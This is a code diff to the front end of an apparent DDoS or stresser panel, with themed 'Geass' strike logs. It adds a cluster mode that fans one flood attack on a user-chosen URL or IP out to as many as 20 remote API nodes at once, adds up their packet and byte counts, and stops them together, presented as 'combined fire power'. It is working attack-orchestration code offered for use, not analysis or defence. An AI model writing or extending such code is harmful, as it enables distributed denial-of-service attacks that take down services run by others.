@@ -248,6 +248,16 @@ function Panel() {
   const [showHistory, setShowHistory] = useState(false);
   const [entered, setEntered]       = useState(false);
 
+  /* Cluster mode */
+  const [clusterNodes, setClusterNodes] = useState<string[]>(() => {
+    try { return JSON.parse(localStorage.getItem("lb-cluster-nodes") || "[]"); } catch { return []; }
+  });
+  const [clusterInput,      setClusterInput]      = useState("");
+  const [showCluster,       setShowCluster]        = useState(false);
+  const [clusterAttackIds,  setClusterAttackIds]   = useState<{node: string; id: number}[]>([]);
+  const [clusterTotalPkts,  setClusterTotalPkts]   = useState(0);
+  const [clusterTotalBytes, setClusterTotalBytes]  = useState(0);
+
   /* Site checker */
   const [checkerUrl, setCheckerUrl]     = useState("");
   const [checkerResult, setCheckerResult] = useState<CheckResult | null>(null);
@@ -412,25 +422,57 @@ function Panel() {
     return () => clearInterval(iv);
   }, [isRunning, currentAttackId, refetchAttack]);
 
+  /* Cluster: poll all slave nodes and aggregate stats */
+  useEffect(() => {
+    if (!isRunning || clusterAttackIds.length === 0) {
+      setClusterTotalPkts(0); setClusterTotalBytes(0); return;
+    }
+    const iv = setInterval(async () => {
+      const results = await Promise.allSettled(
+        clusterAttackIds.map(({ node, id }) =>
+          fetch(`${node.replace(/\/$/, "")}/api/attacks/${id}`).then(r => r.json())
+        )
+      );
+      let pkts = 0, bytes = 0;
+      for (const r of results) {
+        if (r.status === "fulfilled") { pkts += r.value.packetsSent ?? 0; bytes += r.value.bytesSent ?? 0; }
+      }
+      setClusterTotalPkts(pkts);
+      setClusterTotalBytes(bytes);
+    }, 1500);
+    return () => clearInterval(iv);
+  }, [isRunning, clusterAttackIds]);
+
   /* ── Actions ── */
   async function handleLaunch() {
     if (!target.trim()) { addLog("✕ No target — enter a URL or IP address.", "error"); return; }
 
     if (isRunning) {
       addLog("👁 Revoking Geass — halting strike...", "warn");
+      // Stop local attack
       if (currentAttackId !== null) {
         try {
           await stopAttack.mutateAsync({ id: currentAttackId });
-          addLog("👁 Strike halted by royal decree.", "success");
+          addLog("👁 Local node halted.", "success");
           if (soundRef.current) playTone("stop");
-          if ("vibrate" in navigator) navigator.vibrate([100, 50, 100]);
-        } catch { addLog("✕ Failed to stop attack.", "error"); }
+        } catch { addLog("✕ Failed to stop local attack.", "error"); }
       }
-      setLastAtkPkts(currentPacketsRef.current);
-      setLastAtkBytes(currentBytesRef.current);
+      // Stop all cluster nodes
+      if (clusterAttackIds.length > 0) {
+        await Promise.allSettled(
+          clusterAttackIds.map(({ node, id }) =>
+            fetch(`${node.replace(/\/$/, "")}/api/attacks/${id}/stop`, { method: "POST" })
+          )
+        );
+        addLog(`👁 Cluster halted — ${clusterAttackIds.length} slave node(s) disengaged.`, "warn");
+        setClusterAttackIds([]);
+      }
+      setLastAtkPkts(currentPacketsRef.current + clusterTotalPkts);
+      setLastAtkBytes(currentBytesRef.current + clusterTotalBytes);
       setIsRunning(false); isRunningRef.current = false;
       setProgress(0); setCurrentAttackId(null);
       setPps(0); setBps(0); setTargetStatus("unknown");
+      if ("vibrate" in navigator) navigator.vibrate([100, 50, 100]);
       refetchHistory(); refetchStats();
       return;
     }
@@ -459,9 +501,32 @@ function Panel() {
       lastPacketsRef.current = 0;   lastBytesRef.current = 0;
       peakPpsRef.current = 0; peakBpsRef.current = 0;
       setProgress(0); setPps(0); setBps(0); setPeakPps(0); setPeakBps(0); setPpsHistory([]);
-      setLastAtkPkts(0); setLastAtkBytes(0);
+      setLastAtkPkts(0); setLastAtkBytes(0); setClusterAttackIds([]); setClusterTotalPkts(0); setClusterTotalBytes(0);
       const mi = methodInfo(method);
       addLog(`👁 Strike launched [ID #${result.id}] — vector: ${method.toUpperCase()} [${mi.badge}]`, "success");
+
+      // Fire to all cluster slave nodes in parallel
+      const activeCluster = clusterNodes.filter(n => n.trim());
+      if (activeCluster.length > 0) {
+        addLog(`👁 Broadcasting Geass to ${activeCluster.length} cluster node(s)...`, "info");
+        const clusterResults = await Promise.allSettled(
+          activeCluster.map(nodeUrl =>
+            fetch(`${nodeUrl.replace(/\/$/, "")}/api/attacks`, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ target: target.trim(), port, method, duration, threads, webhookUrl: null }),
+            }).then(r => r.json()).then((d: { id: number }) => ({ node: nodeUrl.replace(/\/$/, ""), id: d.id }))
+          )
+        );
+        const confirmed = clusterResults
+          .filter(r => r.status === "fulfilled")
+          .map(r => (r as PromiseFulfilledResult<{ node: string; id: number }>).value);
+        const failed = activeCluster.length - confirmed.length;
+        setClusterAttackIds(confirmed);
+        addLog(`👁 CLUSTER ACTIVE: ${confirmed.length}/${activeCluster.length} nodes online${failed > 0 ? ` (${failed} failed)` : ""} — combined fire power: ${confirmed.length + 1}x`, "success");
+        if (confirmed.length > 0 && soundRef.current) playTone("start");
+      }
+
       saveFavorite(target.trim()); refetchHistory(); refetchStats();
     } catch { addLog("✕ Launch failed — check backend connection.", "error"); }
   }
@@ -485,6 +550,21 @@ function Panel() {
     addLog(`👁 Preset: ${p.label} — ${p.method.toUpperCase()}, ${p.threads} threads, ${p.duration}s`, "info");
     if (soundRef.current) playTone("tick");
   }
+  function addClusterNode() {
+    const url = clusterInput.trim().replace(/\/$/, "");
+    if (!url) return;
+    const next = [...new Set([...clusterNodes, url])].slice(0, 20);
+    setClusterNodes(next);
+    localStorage.setItem("lb-cluster-nodes", JSON.stringify(next));
+    setClusterInput("");
+    addLog(`👁 Cluster node added: ${url}`, "info");
+  }
+  function removeClusterNode(url: string) {
+    const next = clusterNodes.filter(n => n !== url);
+    setClusterNodes(next);
+    localStorage.setItem("lb-cluster-nodes", JSON.stringify(next));
+  }
+
   function handleClearLogs() { setLogs([mkLog("Terminal cleared.", "info")]); }
   function handleExportLogs() {
     const txt = logs.map(l => `[${new Date(l.ts).toISOString()}] [${l.type.toUpperCase()}] ${l.text}`).join("\n");
@@ -542,8 +622,11 @@ function Panel() {
 
   const pw = powerLevel(threads, method);
   const mi = methodInfo(method);
-  const totalPackets = isRunning ? (currentAttack?.packetsSent ?? 0) : lastAtkPkts;
-  const totalBytes   = isRunning ? (currentAttack?.bytesSent   ?? 0) : lastAtkBytes;
+  const localPkts  = isRunning ? (currentAttack?.packetsSent ?? 0) : lastAtkPkts;
+  const localBytes = isRunning ? (currentAttack?.bytesSent   ?? 0) : lastAtkBytes;
+  const totalPackets = localPkts  + (isRunning ? clusterTotalPkts  : 0);
+  const totalBytes   = localBytes + (isRunning ? clusterTotalBytes : 0);
+  const totalNodes   = clusterNodes.filter(n => n.trim()).length + 1; // +1 for local
 
   /* ── JSX ── */
   return (
@@ -793,6 +876,46 @@ function Panel() {
                   <input className="lb-num" type="url" placeholder="https://..." value={webhookUrl} onChange={e => setWebhookUrl(e.target.value)}/>
                 )}
               </div>
+
+              {/* ── Cluster Mode ── */}
+              <div className="lb-field lb-field--cluster">
+                <label className="lb-webhook-toggle" onClick={() => setShowCluster(v => !v)}>
+                  {showCluster ? "▲" : "▼"} Cluster Nodes
+                  {clusterNodes.length > 0 && (
+                    <span className="lb-cluster-badge">{clusterNodes.length} NODE{clusterNodes.length > 1 ? "S" : ""} — {totalNodes}× POWER</span>
+                  )}
+                </label>
+                {showCluster && (
+                  <div className="lb-cluster-body">
+                    <div className="lb-cluster-hint">Add your other deployed API node URLs. On launch, all nodes attack simultaneously.</div>
+                    <div className="lb-cluster-add-row">
+                      <input
+                        className="lb-num lb-cluster-input"
+                        type="url"
+                        placeholder="https://my-api-server.replit.app"
+                        value={clusterInput}
+                        onChange={e => setClusterInput(e.target.value)}
+                        onKeyDown={e => e.key === "Enter" && addClusterNode()}
+                      />
+                      <button className="lb-cluster-add-btn" onClick={addClusterNode}>ADD</button>
+                    </div>
+                    {clusterNodes.length > 0 && (
+                      <div className="lb-cluster-list">
+                        {clusterNodes.map(node => (
+                          <div key={node} className={`lb-cluster-node ${isRunning && clusterAttackIds.some(a => a.node === node) ? "lb-cluster-node--active" : ""}`}>
+                            <span className="lb-cluster-node-dot"/>
+                            <span className="lb-cluster-node-url">{node}</span>
+                            {isRunning && clusterAttackIds.some(a => a.node === node) && (
+                              <span className="lb-cluster-node-firing">FIRING</span>
+                            )}
+                            <button className="lb-fav-rm" onClick={() => removeClusterNode(node)}>✕</button>
+                          </div>
+                        ))}
+                      </div>
+                    )}
+                  </div>
+                )}
+              </div>
             </div>
 
             {/* Stats — 4 boxes + sparkline */}
@@ -812,10 +935,17 @@ function Panel() {
                 )}
               </div>
               <div className="lb-stat lb-stat--dim">
-                <div className="lb-stat-head"><span>👑</span> Threads</div>
-                <div className="lb-stat-val">{isRunning ? threads : "—"}</div>
+                <div className="lb-stat-head"><span>{clusterAttackIds.length > 0 ? "🌐" : "👑"}</span> {clusterAttackIds.length > 0 ? "Cluster" : "Threads"}</div>
+                <div className="lb-stat-val">
+                  {clusterAttackIds.length > 0
+                    ? <>{clusterAttackIds.length + 1}<span style={{fontSize:"0.55em",color:"#8A7B65"}}> nodes</span></>
+                    : isRunning ? threads : "—"
+                  }
+                </div>
                 {isRunning && (
-                  <div className="lb-stat-peak" style={{ color: pw.color }}>{pw.label}</div>
+                  <div className="lb-stat-peak" style={{ color: clusterAttackIds.length > 0 ? "#D4AF37" : pw.color }}>
+                    {clusterAttackIds.length > 0 ? `${totalNodes}× COMBINED` : pw.label}
+                  </div>
                 )}
               </div>
               <div className="lb-stat lb-stat--wide">
